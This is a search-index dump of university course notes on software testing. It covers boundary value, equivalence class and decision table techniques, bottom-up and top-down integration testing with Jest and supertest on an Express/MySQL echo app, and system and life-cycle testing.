Unit testing Unit testing - test individual smallest units of the system. Integration testing - test related units/subcomponents of the system, which are related (according to the system design) System testing - test the system as a whole, (often according to the user cases).","title":"Levels of testing"},{"location":"notes/l9_1_blackbox_unittest/#unit-testing","text":"Unit Testing is the test conducted against a software system in the smallest granularity. The smallest granularity is loosely defined. Depending on the choice of detailed design, implementation, programming language and framework, a unit can be either A function A class A module A UI component","title":"Unit Testing"},{"location":"notes/l9_1_blackbox_unittest/#specification-based-unit-testing","text":"The following are some common techniques of defining test cases of specification-based unit testing Boundary value testing Equivalence class testing Decision table testing Based on the type, the domain and the dependencies of the inputs, we shortlist the techniques which more appropriate Assumption on input Techniques Numerical value, ordinal value boundary value, equivalence class Inputs are independent boundary value, equivalence class Inputs are depenedent Decision table","title":"Specification-based Unit Testing"},{"location":"notes/l9_1_blackbox_unittest/#boundary-value-testing","text":"In Boundary value testing, to define the test cases, we analyse the inputs to the test subject by identifying what are the input variables. what are the valid ranges. For example, consider a function f(x1,x2) takes two arguments x1 and x2 and compute some output. Based on the specification, we note that the following conditions should apply \\[ a \\leq x_1 \\leq b \\] \\[ c \\leq x_2 \\leq d \\] If we plot out a graph The grey region denotes the domain of function f . One way to generate test case based on the given domain of f is to identify the boundaries of the grey region and we pick the values from the boundary The rationale behind the boundary value testing is that errors tend to occur near the extreme values of its inputs, e.g. starting/ending indices of an array, off-by-one errors in a loop, etc.","title":"Boundary Value Testing"},{"location":"notes/l9_1_blackbox_unittest/#normal-boundary-value-testing","text":"We consider the following two assumptions. assuming that our source language is strongly type and the type checker would reject values of the inputs out side of the domain. assuming when an error occurs it is solely caused by one of the inputs but not both. With these two assumptions, we can select values as input for testing as \\[ \\begin{array}{c} (x^{min}_1, x^{mean}_2) \\\\ (x^{min}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{mean}_2) \\\\ (x^{max}_1-1, x^{mean}_2) \\\\ (x^{max}_1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2) \\\\ (x^{mean}_1, x^{min}_2+1) \\\\ (x^{mean}_1, x^{max}_2-1) \\\\ (x^{mean}_1, x^{max}_2) \\end{array} \\] where $x^{min}_1 = a, x^{max}_1 = b, x^{mean}_1 = (b-a)/2 $ $x^{min}_2 = c, x^{max}_2 = d, x^{mean}_2 = (d-c)/2 $","title":"Normal Boundary Value Testing"},{"location":"notes/l9_1_blackbox_unittest/#example","text":"Consider the following function /** * * @param {number} h - the current time in source timezone, in hour, in range of [0,23] * @param {number} stz - the source timezone, in range of [-12, +14] * timezone list https://www.ibm.com/docs/en/cloudpakw3700/2.3.0.0?topic=SS6PD2_2.3.0/doc/psapsys_restapi/time_zone_list.htm * @param {number} ttz - the target timezone, in range of [-12, +14] * @returns {[number,number]} - the current time in target timezone, in hour, in range of [0,23] and a day offset in the range of {-2,-1,0,1,2} */ function tzconvert(h, stz, ttz) { // not yet implemented } Applying Normal Boundary Value Test, We identify the following test cases id h stz ttz expected output 1 0 1 1 [0,0] 2 1 1 1 [1,0] 3 11 1 1 [11,0] 4 22 1 1 [22,0] 5 23 1 1 [23,0] 6 11 -12 1 [0,1] 7 11 -11 1 [23,0] 8 11 13 1 [23,-1] 9 11 14 1 [22,-1] 10 11 1 -12 [22,-1] 11 11 1 -11 [23,-1] 12 11 1 13 [23, 0] 13 11 1 14 [0, 1]","title":"Example"},{"location":"notes/l9_1_blackbox_unittest/#robust-boundary-value-testing","text":"If drop the first assumption, we should also include the out of range values in our test cases, namely besides the 9 tuples listed earlier, we include the following \\[ \\begin{array}{c} (x^{min}_1-1, x^{mean}_2) \\\\ (x^{max}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2-1) \\\\ (x^{mean}_1, x^{max}_2+1) \\end{array} \\]","title":"Robust Boundary Value Testing"},{"location":"notes/l9_1_blackbox_unittest/#example_1","text":"If we apply Robust Boundary Value Testing to the previous example i.e. tzconvert() function , we identify a few extra test cases as follows id h stz ttz expected output 14 -1 1 1 invalid 15 24 1 1 invalid 16 11 -13 1 invalid 17 11 15 1 invalid 18 11 1 -13 invalid 19 11 1 15 invalid","title":"Example"},{"location":"notes/l9_1_blackbox_unittest/#worst-boundary-value-testing","text":"If we drop the second assumption, we need to consider those points near the \"corners\". For Normal Worst Boundary Value test, we include \\[ \\begin{array}{c} (x^{min}_1, x^{min}_2) \\\\ (x^{min}_1, x^{min}_2+1) \\\\ (x^{min}_1+1, x^{min}_2) \\\\ (x^{min}_1+1, x^{min}_2+1) \\\\ (x^{max}_1, x^{max}_2) \\\\ (x^{max}_1-1, x^{max}_2) \\\\ (x^{max}_1, x^{max}_2-1) \\\\ (x^{max}_1-1, x^{max}_2-1) \\\\ (x^{min}_1, x^{max}_2) \\\\ (x^{min}_1, x^{max}_2-1) \\\\ (x^{min}_1+1, x^{max}_2) \\\\ (x^{min}_1+1, x^{max}_2-1) \\\\ (x^{max}_1, x^{min}_2) \\\\ (x^{max}_1-1, x^{min}_2) \\\\ (x^{max}_1, x^{min}_2+1) \\\\ (x^{max}_1-1, x^{min}_2+1) \\end{array} \\] For Robust Worst Boundary Value test, we include, \\[ \\begin{array}{c} (x^{min}_1-1, x^{min}_2-1) \\\\ (x^{min}_1-1, x^{min}_2) \\\\ (x^{min}_1-1, x^{min}_2+1) \\\\ (x^{min}_1, x^{min}_2-1) \\\\ (x^{min}_1+1, x^{min}_2-1) \\\\ (x^{max}_1+1, x^{max}_2+1) \\\\ (x^{max}_1+1, x^{max}_2) \\\\ (x^{max}_1+1, x^{max}_2-1) \\\\ (x^{max}_1, x^{max}_2+1) \\\\ (x^{max}_1-1, x^{max}_2+1) \\\\ (x^{min}_1-1, x^{max}_2+1) \\\\ (x^{min}_1, x^{max}_2+1) \\\\ (x^{min}_1+1, x^{max}_2+1) \\\\ (x^{min}_1-1, x^{max}_2) \\\\ (x^{min}_1-1, x^{max}_2-1) \\\\ (x^{max}_1+1, x^{min}_2-1) \\\\ (x^{max}_1+1, x^{min}_2) \\\\ (x^{max}_1+1, x^{min}_2+1) \\\\ (x^{max}_1, x^{min}_2-1) \\\\ (x^{max}_1-1, x^{min}_2-1) \\end{array} \\]","title":"Worst Boundary Value Testing"},{"location":"notes/l9_1_blackbox_unittest/#exercises-non-graded","text":"Can you find out what are the extra test cases generated if we apply Robust Worst Boundary Value Testing to the tzconvert() function?","title":"Exercises (Non graded)"},{"location":"notes/l9_1_blackbox_unittest/#equivalence-class-testing","text":"One issue with Boundary Value Testing is that there could be too many test cases and many of them could be redundant. The intuition of the equivalence is to avoid redundancy in test cases and yet to offer a complete test. The term equivalence class refers to the math definition of equivalence relation in set theory. Given Given a domain \\(A\\) , a relation \\(R \\subseteq A \\times A\\) is a equivalence relation iff \\(R\\) is reflexive, symmetric and transitive. We can think of \\(R\\) defines a partition peer relation. For instance, we have for any \\(a \\in A\\) , \\(a R\\ a\\) , i.e. \\(a_i\\) s are in its own partition for any \\(a_1, a_2 \\in A\\) , we have \\(a_1 R\\ a_2\\) implies \\(a_2 R\\ a_1\\) , i.e. if \\(a_1\\) in the partition of \\(a_2\\) , then \\(a_2\\) is in the parition of \\(a_1\\) . for any \\(a_1, a_2, a_3 \\in A\\) , we have \\(a_1 R\\ a_2\\) and \\(a_2 R\\ a_3\\) imply \\(a_1 R\\ a_3\\) , i.e. if \\(a_1\\) and \\(a_2\\) are in the same partition, and \\(a_2\\) and \\(a_3\\) are in the same partition, then \\(a_1\\) and \\(a_3\\) are in the same partition. Equivalence class testing means to test with an element from each input partition. For example, recall the previous example, we would pick one point for each cell in \"grid\" Note that in the Strong Robust Equivalence Class Testing , we would include the dots from the top-left, top-right, bottom-left and bottom-right cells.","title":"Equivalence Class Testing"},{"location":"notes/l9_1_blackbox_unittest/#example_2","text":"For instance if we apply Equivalence Class Testing (not strong robust) to the tzconvert() function, we only need to consider test cases 3, 14, 15, 16, 17, 18, 19 . If we argue that the valid test cases are too fews, we could further partition the valid input region, into 2 or 4 sub regions. As we can observe equivalence class testing help to reduce the number of cases based on the assumption that data points in the same partition yield the same outcome. Its reliability depends on how to partitions.","title":"Example"},{"location":"notes/l9_1_blackbox_unittest/#decision-table-testing","text":"When there exists some dependency among the inputs, it is more applicable to use Decision Table Testing. Consider the following function /** * * @param {number} d - the day in digit, [1,31] * @param {number} m - the month in digit, [1,12] * @param {number} y - the year in digit, [0,inf) * @returns {[number,number,number]} - the next day in date [day,month,year] */ function nextdate(d,m,y) { // TODO } Applying boundary value testing and equivalence class testing might not make too much sense in this case, since the domain (partitions) are not well defined, e.g. there are too many special cases. For instance, Feb 28 days in non-leap years, 29 days in leap years; Jan, Mar, May, Jul, Aug, Oct, Dec have 31 days, while Apr, Jun, Sep and Nov have 30 days; Years that not in dd00 patterns and can be divisible by 4 are leap years, Given a Year in dd00 pattern and dd is divisible by 4 then the year is leap. Let's define M1 = {month: month has 30 days} M2 = {month: month has 31 days except December} M3 = {month: month is December} M4 = {month: month is February} D1 = {day: 1 \\(\\leq\\) day \\(\\leq\\) 27} D2 = {day: day = 28} D3 = {day: day = 29} D4 = {day: day = 30} D5 = {day: day = 31} Y1 = {year: year is a leap year} Y2 = {year: year is a common year} We list down the input constaints combination and output possibilities in a table ~ 1 2 3 4 5 6 7 8 9 10 m M1 M1 M1 M1 M1 M2 M2 M2 M2 M2 d D1 D2 D3 D4 D5 D1 D2 D3 D4 D5 y - - - - - - - - - - actions impossible X d+1 X X X X X X X d=1 X X m+1 X X m=1 y+1 ~ 11 12 13 14 15 16 17 18 19 20 21 22 m M3 M3 M3 M3 M3 M4 M4 M4 M4 M4 M4 M4 d D1 D2 D3 D4 D5 D1 D2 D2 D3 D3 D4 D5 y - - - - - - Y1 Y2 Y1 Y2 - - actions impossible X X X d+1 X X X X X X d=1 X X X m+1 X X m=1 X y+1 X Rows above actions are the combinations of input constgraints Rows below actions are the output possibilities. Based on the above table, we can generate the test cases by randomly generate a set of d , m and y that satisfy the rule id, as follow id d m y expected output rule id 1 10 4 1999 11,4,1999 1 2 28 6 2001 29,6, 2001 2 ...","title":"Decision Table Testing"},{"location":"notes/l9_2_integrationtest/","text":"50.003 - Specification-based Integration Testing and System Testing Learning Outcomes Identify the difference between decomposition-based integration testing and call graph-based integration testing. Conduct integration test using Jest. Derive system testing test cases based on the user case documentations. Develop testing strategies based different software development life cycle. Levels of testing Recall Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design Unit testing Unit testing - test individual smallest units of the system. Integration testing - test related units/subcomponents of the system, which are related (according to the system design) System testing - test the system as a whole, (often according to the user cases). In this unit, we study integration testing. Integration Test There are two main approaches of performing integration tests Decomposition-based testing Call graph-based testing Decomposition-based testing In Decomposition-based integration testing, we follow the modular structure of the system design. graph Program-->Function1 Program-->Function2 Program-->Function3 Function1-->SubFunction1 Function1-->SubFunction2 Function2-->SubFunction3 Function2-->SubFunction4 Function3-->SubFunction5 We perform integration test by following the structure. There are two possible directions. 1. Top-down integration testing 1. Bottom-up integration testing Top-Down Integration testing In top-down decomposition-based integration testing, we mock up all the sub-components below the main program, and test the main program. graph Program-->Function1* Program-->Function2* Program-->Function3* Function1*-->SubFunction1* Function1*-->SubFunction2* Function2*-->SubFunction3* Function2*-->SubFunction4* Function3*-->SubFunction5* We put an asterix to denote that function is mocked. After the main program being tested against the mocked functions, we start to replace the mockded codes with the actual codes starting from the first left child until the bottom right child following the breadth first search order. graph Program-->Function1 Program-->Function2* Program-->Function3* Function1-->SubFunction1* Function1-->SubFunction2* Function2*-->SubFunction3* Function2*-->SubFunction4* Function3*-->SubFunction5* The rationale of the top-down integration test is that when we encounter an error, the error must be caused by the integration of the newly unmocked code. Bottom-up Integration testing Bottom-up decomposition-based integration testing starts from the bottom left-most or the right most leaf function. We test the leaf functions by making use of the unit test codes (now we call it the driver code). graph Program*-->Function1* Program*-->Function2* Program*-->Function3* Function1*-->SubFunction1 Function1*-->SubFunction2 Function2*-->SubFunction3 Function2*-->SubFunction4 Function3*-->SubFunction5 Note that in the above diagram, the components associated with an asterix are yet to be integrated in the integration test. We then move up the structure by integrating the parents of the leaf functions, (and using the unit test code). We repeat the process until we reach the top. graph Program*-->Function1 Program*-->Function2 Program*-->Function3 Function1-->SubFunction1 Function1-->SubFunction2 Function2-->SubFunction3 Function2-->SubFunction4 Function3-->SubFunction5 By doing so, we need not mock up the code as we can reuse (or modify) the unit-test code as drivers. Limitation The limitation of decomposition-based testing is that the structure is defined by the lexical structure of the source code (definition structure), which often does not reflect the execution and function call relation. For example, recall in our Echo App (the restful API version), we have two major components in the app. By following the code structure we have. graph app-->EchoRouter app-->MessageModel EchoRouter-->get.all EchoRouter-->post.submit MessageModel-->all MessageModel-->insertOne MessageModel-->insertMany However, we find that we hardly have code from app to call MessageModel directly. In most of the situation, the call sequence is app-->EchoRouter-->MessageModel. Call-graph based integration To address the issue with Decomposition based integration, we define the integration structure by following the call graph. For instance, here is the call graph of our Echo App graph app-->EchoRouter EchoRouter-->get.all EchoRouter-->post.submit get.all-->MessageModel.all post.submit-->MessageModel.all post.submit-->MessageModel.insertMany MessageModel.insertMany--> MessageModel.insertOne Note that insertMany() is never used. Now we can apply the similar top-down or bottom-up integration test strategies. Example We reuse the my_mysql_app developed in the earlier units. We start by including jest and supertest in the project npm i jest supertest and modify package.json to change \"scripts\": { \"start\": \"node ./bin/www\" }, to \"scripts\": { \"start\": \"node ./bin/www\", \"test\": \"jest\" // added }, Then we create a sub folder __test__ under the project root folder. Now we should have a project folder structure as the following . \u251c\u2500\u2500 __test__ \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u2502 \u2514\u2500\u2500 www \u251c\u2500\u2500 models \u2502 \u251c\u2500\u2500 db.js \u2502 \u2514\u2500\u2500 message.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 images \u2502 \u251c\u2500\u2500 javascripts \u2502 \u2514\u2500\u2500 stylesheets \u2502 \u2514\u2500\u2500 style.css \u251c\u2500\u2500 routes \u2502 \u251c\u2500\u2500 index.js \u2502 \u251c\u2500\u2500 echo.js \u2502 \u2514\u2500\u2500 users.js \u2514\u2500\u2500 views \u251c\u2500\u2500 error.ejs \u2514\u2500\u2500 index.ejs Unit Testing Model message.all First we define a unit test on on models/message.js 's function all() . In the __test__ folder we add a test file message.test.js with the following content const db = require('../../models/db.js'); const message = require('../../models/message.js'); async function setup() { try { await db.pool.query(` DELETE FROM message;` ); await db.pool.query(` INSERT INTO message (msg, time) VALUES ('msg a', '2009-01-01:00:00:00'), ('msg b', '2009-01-02:00:00:00') `); } catch (error) { console.error(\"setup failed. \" + error); throw error; } } async function teardown() { try { await db.pool.query(` DELETE FROM message;` ); await db.cleanup(); } catch (error) { console.error(\"teardown failed. \" + error); throw error; } } describe(\"models.message.all() tests\", () => { beforeAll(async () => { await setup(); }); test (\"testing message.all()\", () => { const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), new message.Message('msg b', new Date('2009-01-02:00:00:00'))] const result_promise = message.all(); result_promise.then((result) => { expect(result.sort()).toEqual(expected.sort()); }); }); afterAll(async () => { await teardown(); }); }) The setup and teardown define the setup and tear-down routine of this test suite. Note that in the actual project, you might consider backing up and restoring the actual table data in the setup and teardown functions. In the test suite, we define only one test. When we run npm run test message.test.js we see > my-mysql-app@0.0.0 test > jest --detectOpenHandles message.test.js console.log 2 at Object.log (models/message.js:36:17) PASS __test__/models/message.test.js models.message.all() tests \u2713 testing message.all() (3 ms) Test Suites: 1 passed, 1 total Tests: 1 passed, 1 total Snapshots: 0 total Time: 0.496 s, estimated 1 s Ran all test suites matching /message.test.js/i. Integration Test with Echo Router and Model message.all Next we define a bottom-up integration testing by integrating the path from get.all to message.all() . graph app-->EchoRouter EchoRouter-->get.all get.all-->MessageModel.all In the __test__ folder we define a new test file echo.test.js with the following content const db = require('../../models/db.js'); const message = require('../../models/message.js'); const request = require('supertest') const app = require('../../app'); async function setup() { try { // TODO backup the existing data to a temp table? await db.pool.query(` DELETE FROM message;` ); await db.pool.query(` INSERT INTO message (msg, time) VALUES ('msg a', '2009-01-01:00:00:00'), ('msg b', '2009-01-02:00:00:00') `); } catch (error) { console.error(\"setup failed. \" + error); throw error; } } async function teardown() { // TODO restore the table from the backup; try { await db.pool.query(` DELETE FROM message;` ); await db.cleanup(); } catch (error) { console.error(\"teardown failed. \" + error); throw error; } } describe(\"routes.echo endpoint integration tests\", () => { beforeAll(async () => { await setup(); }); test (\"testing /echo/all\", async () => { const res = await request(app).get('/echo/all'); const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), new message.Message('msg b', new Date('2009-01-02:00:00:00'))] expect(res.statusCode).toEqual(200); const json = JSON.parse(res.text); const received = []; for (let i in json) { received.push(new message.Message(json[i].msg, new Date(json[i].time))) } expect(received.sort()).toEqual(expected.sort()); }); afterAll(async () => { await teardown(); }); }) The setup and teardown routines are similar to the unit test for message.all() . The only difference is that in the test case, we initiate the call from the app level which trigger the router handler with URL path /echo/all . We then extract the returned text returned from the handler, and parse it back to a json object. Finally we compared the received results (created from json ) and the expected result. When we run npm run test echo.test.js we see > my-mysql-app@0.0.0 test > jest --detectOpenHandles echo.test.js console.log 2 at Object.log (models/message.js:36:17) GET /echo/all 200 28.616 ms - 101 PASS __test__/models/echo.test.js routes.echo endpoint integration tests \u2713 testing /echo/all (66 ms) Test Suites: 1 passed, 1 total Tests: 1 passed, 1 total Snapshots: 0 total Time: 0.678 s, estimated 1 s Ran all test suites matching /echo.test.js/i. Cyclic call-graph In case that the call-graph contains cycles, i.e. due to mutual recursion, we have to test the strong connected components as a unit Pairwise testing Besides top-down or bottom-up strategies, an alternative is to perform pair-wise testing. The idea is to test each edge of the call-graph. Similar to bottom-up strategy, we could convert unit tests for invidiual unit into test drivers for every pair, saving some effort in mock-up effort. One advantage of pairwise testing is to higher degree of fault isolation. System Testing System testing is often less formal compared to unit testing and integration test. Test cases of the system testing can be derived from The use case documents and use case diagrams The sequence diagrams The state machine diagrams For instance given the following use case document Use case ID UC 1 Use case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Primary Actor User Secondary Actor Echo App Normal Flow 1. User navigates to https://localhost:3000/echo/ 2. User enters a new text message and submits 3. Echo App receives the message and inserts it into the database 4. Echo App returns the list of all messages in the database and display in the UI Alternative Flow Post-conditions nil We can define a system test case as follows Test case ID TC 1 Test case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Event Sequence Input User navigates to https://localhost:3000/echo/ Output The new message form is displayed Input User enters a new text message and submits Output The list of messages in the system is returned and rendered, which includes the newly submitted message. Post-conditions nil Life-cycle based testing In this section, we discuss how to incoporate the testing activities along with the software development life-cycle. Waterfall testing In Walterfall software life-cycle, we could easily incoprate the testing activities as the last few phases. graph A(\"Requirements Specification\") --> B B(\"Analysis\") --> C C(\"Design\") --> D D(\"Coding\") --> E E(\"Unit Testing\") --> F F(\"Integration Test\") --> G(\"System Test\") As highlighted in the earlier lesson, Waterfall testing as part of the waterfall development life-cycle, suffers from the long feedback interval issues. Iterative Life Cycle testing In Iterative Software Dvelopment Life Cycle, we break and stage different parts/levels of the system components to be developed in different iterations. graph Z(\"Previous Iteration\") --> A A(\"Specification\") --> B B(\"Analysis\") --> C C(\"Design\") --> D D(\"Coding\") --> E E(\"Unit Testing\") --> F F(\"Integration Testing\") --> G G(\"Regression Testing\") --> H H(\"Progression Testing\") --> I(\"Next Iteration\") In terms of testing, we follow a similar structure of waterfall testing for each iteration, except that towards the end, we conduct regression testing and progression testing instead of system test. Regression testing - to re-test the test cases defined and passed in the previous iterations. Progress testing - to pre-test the test cases defined in the upcoming iterations, some of them should fail. Agile Testing Recall in Agile development, the development plans are engineered to focus Customer-driven Bottom\u2013up development Flexibility with respect to changing requirements Early delivery of fully functional components Agile Development is often divided into sprints. In each sprints, development team liaise with the project users to identify the deliverables that should be delivered in the particular sprint. In the testing aspect, the testing must be aligned with the user story development for each sprint. graph A(\"Customer Expectation\")-->B B(\"Iteration Plan\")-->C C(\"User Story\")-->D D(\"Design\")-->E E(\"Coding\")-->F F(\"Unit Testing\")-->G G(\"Integration Testing\")-->H H(\"Regression Testing\")-->C Futher Reading https://lambtsa.medium.com/rest-api-with-express-router-jest-and-supertest-10832a23016f https://medium.com/geekculture/testing-express-js-with-jest-8c6855945f03","title":"50.003 - Specification-based Integration Testing and System Testing"},{"location":"notes/l9_2_integrationtest/#50003-specification-based-integration-testing-and-system-testing","text":"","title":"50.003 - Specification-based Integration Testing and System Testing"},{"location":"notes/l9_2_integrationtest/#learning-outcomes","text":"Identify the difference between decomposition-based integration testing and call graph-based integration testing. Conduct integration test using Jest. Derive system testing test cases based on the user case documentations. Develop testing strategies based different software development life cycle.","title":"Learning Outcomes"},{"location":"notes/l9_2_integrationtest/#levels-of-testing","text":"Recall Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design Unit testing Unit testing - test individual smallest units of the system. Integration testing - test related units/subcomponents of the system, which are related (according to the system design) System testing - test the system as a whole, (often according to the user cases). In this unit, we study integration testing.","title":"Levels of testing"},{"location":"notes/l9_2_integrationtest/#integration-test","text":"There are two main approaches of performing integration tests Decomposition-based testing Call graph-based testing","title":"Integration Test"},{"location":"notes/l9_2_integrationtest/#decomposition-based-testing","text":"In Decomposition-based integration testing, we follow the modular structure of the system design. graph Program-->Function1 Program-->Function2 Program-->Function3 Function1-->SubFunction1 Function1-->SubFunction2 Function2-->SubFunction3 Function2-->SubFunction4 Function3-->SubFunction5 We perform integration test by following the structure. There are two possible directions. 1. Top-down integration testing 1. Bottom-up integration testing","title":"Decomposition-based testing"},{"location":"notes/l9_2_integrationtest/#top-down-integration-testing","text":"In top-down decomposition-based integration testing, we mock up all the sub-components below the main program, and test the main program. graph Program-->Function1* Program-->Function2* Program-->Function3* Function1*-->SubFunction1* Function1*-->SubFunction2* Function2*-->SubFunction3* Function2*-->SubFunction4* Function3*-->SubFunction5* We put an asterix to denote that function is mocked. After the main program being tested against the mocked functions, we start to replace the mockded codes with the actual codes starting from the first left child until the bottom right child following the breadth first search order. graph Program-->Function1 Program-->Function2* Program-->Function3* Function1-->SubFunction1* Function1-->SubFunction2* Function2*-->SubFunction3* Function2*-->SubFunction4* Function3*-->SubFunction5* The rationale of the top-down integration test is that when we encounter an error, the error must be caused by the integration of the newly unmocked code.","title":"Top-Down Integration testing"},{"location":"notes/l9_2_integrationtest/#bottom-up-integration-testing","text":"Bottom-up decomposition-based integration testing starts from the bottom left-most or the right most leaf function. We test the leaf functions by making use of the unit test codes (now we call it the driver code). graph Program*-->Function1* Program*-->Function2* Program*-->Function3* Function1*-->SubFunction1 Function1*-->SubFunction2 Function2*-->SubFunction3 Function2*-->SubFunction4 Function3*-->SubFunction5 Note that in the above diagram, the components associated with an asterix are yet to be integrated in the integration test. We then move up the structure by integrating the parents of the leaf functions, (and using the unit test code). We repeat the process until we reach the top. graph Program*-->Function1 Program*-->Function2 Program*-->Function3 Function1-->SubFunction1 Function1-->SubFunction2 Function2-->SubFunction3 Function2-->SubFunction4 Function3-->SubFunction5 By doing so, we need not mock up the code as we can reuse (or modify) the unit-test code as drivers.","title":"Bottom-up Integration testing"},{"location":"notes/l9_2_integrationtest/#limitation","text":"The limitation of decomposition-based testing is that the structure is defined by the lexical structure of the source code (definition structure), which often does not reflect the execution and function call relation. For example, recall in our Echo App (the restful API version), we have two major components in the app. By following the code structure we have. graph app-->EchoRouter app-->MessageModel EchoRouter-->get.all EchoRouter-->post.submit MessageModel-->all MessageModel-->insertOne MessageModel-->insertMany However, we find that we hardly have code from app to call MessageModel directly. In most of the situation, the call sequence is app-->EchoRouter-->MessageModel.","title":"Limitation"},{"location":"notes/l9_2_integrationtest/#call-graph-based-integration","text":"To address the issue with Decomposition based integration, we define the integration structure by following the call graph. For instance, here is the call graph of our Echo App graph app-->EchoRouter EchoRouter-->get.all EchoRouter-->post.submit get.all-->MessageModel.all post.submit-->MessageModel.all post.submit-->MessageModel.insertMany MessageModel.insertMany--> MessageModel.insertOne Note that insertMany() is never used. Now we can apply the similar top-down or bottom-up integration test strategies.","title":"Call-graph based integration"},{"location":"notes/l9_2_integrationtest/#example","text":"We reuse the my_mysql_app developed in the earlier units. We start by including jest and supertest in the project npm i jest supertest and modify package.json to change \"scripts\": { \"start\": \"node ./bin/www\" }, to \"scripts\": { \"start\": \"node ./bin/www\", \"test\": \"jest\" // added }, Then we create a sub folder __test__ under the project root folder. Now we should have a project folder structure as the following . \u251c\u2500\u2500 __test__ \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u2502 \u2514\u2500\u2500 www \u251c\u2500\u2500 models \u2502 \u251c\u2500\u2500 db.js \u2502 \u2514\u2500\u2500 message.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 images \u2502 \u251c\u2500\u2500 javascripts \u2502 \u2514\u2500\u2500 stylesheets \u2502 \u2514\u2500\u2500 style.css \u251c\u2500\u2500 routes \u2502 \u251c\u2500\u2500 index.js \u2502 \u251c\u2500\u2500 echo.js \u2502 \u2514\u2500\u2500 users.js \u2514\u2500\u2500 views \u251c\u2500\u2500 error.ejs \u2514\u2500\u2500 index.ejs","title":"Example"},{"location":"notes/l9_2_integrationtest/#unit-testing-model-messageall","text":"First we define a unit test on on models/message.js 's function all() . In the __test__ folder we add a test file message.test.js with the following content const db = require('../../models/db.js'); const message = require('../../models/message.js'); async function setup() { try { await db.pool.query(` DELETE FROM message;` ); await db.pool.query(` INSERT INTO message (msg, time) VALUES ('msg a', '2009-01-01:00:00:00'), ('msg b', '2009-01-02:00:00:00') `); } catch (error) { console.error(\"setup failed. \" + error); throw error; } } async function teardown() { try { await db.pool.query(` DELETE FROM message;` ); await db.cleanup(); } catch (error) { console.error(\"teardown failed. \" + error); throw error; } } describe(\"models.message.all() tests\", () => { beforeAll(async () => { await setup(); }); test (\"testing message.all()\", () => { const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), new message.Message('msg b', new Date('2009-01-02:00:00:00'))] const result_promise = message.all(); result_promise.then((result) => { expect(result.sort()).toEqual(expected.sort()); }); }); afterAll(async () => { await teardown(); }); }) The setup and teardown define the setup and tear-down routine of this test suite. Note that in the actual project, you might consider backing up and restoring the actual table data in the setup and teardown functions. In the test suite, we define only one test. When we run npm run test message.test.js we see > my-mysql-app@0.0.0 test > jest --detectOpenHandles message.test.js console.log 2 at Object.log (models/message.js:36:17) PASS __test__/models/message.test.js models.message.all() tests \u2713 testing message.all() (3 ms) Test Suites: 1 passed, 1 total Tests: 1 passed, 1 total Snapshots: 0 total Time: 0.496 s, estimated 1 s Ran all test suites matching /message.test.js/i.","title":"Unit Testing Model message.all"},{"location":"notes/l9_2_integrationtest/#integration-test-with-echo-router-and-model-messageall","text":"Next we define a bottom-up integration testing by integrating the path from get.all to message.all() . graph app-->EchoRouter EchoRouter-->get.all get.all-->MessageModel.all In the __test__ folder we define a new test file echo.test.js with the following content const db = require('../../models/db.js'); const message = require('../../models/message.js'); const request = require('supertest') const app = require('../../app'); async function setup() { try { // TODO backup the existing data to a temp table? await db.pool.query(` DELETE FROM message;` ); await db.pool.query(` INSERT INTO message (msg, time) VALUES ('msg a', '2009-01-01:00:00:00'), ('msg b', '2009-01-02:00:00:00') `); } catch (error) { console.error(\"setup failed. \" + error); throw error; } } async function teardown() { // TODO restore the table from the backup; try { await db.pool.query(` DELETE FROM message;` ); await db.cleanup(); } catch (error) { console.error(\"teardown failed. \" + error); throw error; } } describe(\"routes.echo endpoint integration tests\", () => { beforeAll(async () => { await setup(); }); test (\"testing /echo/all\", async () => { const res = await request(app).get('/echo/all'); const expected = [ new message.Message('msg a', new Date('2009-01-01:00:00:00')), new message.Message('msg b', new Date('2009-01-02:00:00:00'))] expect(res.statusCode).toEqual(200); const json = JSON.parse(res.text); const received = []; for (let i in json) { received.push(new message.Message(json[i].msg, new Date(json[i].time))) } expect(received.sort()).toEqual(expected.sort()); }); afterAll(async () => { await teardown(); }); }) The setup and teardown routines are similar to the unit test for message.all() . The only difference is that in the test case, we initiate the call from the app level which trigger the router handler with URL path /echo/all . We then extract the returned text returned from the handler, and parse it back to a json object. Finally we compared the received results (created from json ) and the expected result. When we run npm run test echo.test.js we see > my-mysql-app@0.0.0 test > jest --detectOpenHandles echo.test.js console.log 2 at Object.log (models/message.js:36:17) GET /echo/all 200 28.616 ms - 101 PASS __test__/models/echo.test.js routes.echo endpoint integration tests \u2713 testing /echo/all (66 ms) Test Suites: 1 passed, 1 total Tests: 1 passed, 1 total Snapshots: 0 total Time: 0.678 s, estimated 1 s Ran all test suites matching /echo.test.js/i.","title":"Integration Test with Echo Router and Model message.all"},{"location":"notes/l9_2_integrationtest/#cyclic-call-graph","text":"In case that the call-graph contains cycles, i.e. due to mutual recursion, we have to test the strong connected components as a unit","title":"Cyclic call-graph"},{"location":"notes/l9_2_integrationtest/#pairwise-testing","text":"Besides top-down or bottom-up strategies, an alternative is to perform pair-wise testing. The idea is to test each edge of the call-graph. Similar to bottom-up strategy, we could convert unit tests for invidiual unit into test drivers for every pair, saving some effort in mock-up effort. One advantage of pairwise testing is to higher degree of fault isolation.","title":"Pairwise testing"},{"location":"notes/l9_2_integrationtest/#system-testing","text":"System testing is often less formal compared to unit testing and integration test. Test cases of the system testing can be derived from The use case documents and use case diagrams The sequence diagrams The state machine diagrams For instance given the following use case document Use case ID UC 1 Use case name Create New Message Objective The user creates a new message which will be stored in the Echo app DB Pre-conditions nil Primary Actor User Secondary Actor Echo App Normal Flow 1. User navigates to https://localhost:3000/echo/ 2. User enters a new text message and submits 3. Echo App receives the message and inserts it into the database 4. Echo App returns the list of all 